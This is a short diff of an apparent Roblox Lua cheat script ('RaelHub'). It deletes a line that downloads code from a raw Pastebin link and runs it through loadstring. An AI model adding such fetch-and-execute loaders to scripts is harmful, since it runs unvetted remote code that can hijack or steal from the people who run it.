@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/zk9Dqw8W"))()
-
 local RaelHubFunction = {}
 
 local VirtualUser = game:GetService("VirtualUser")
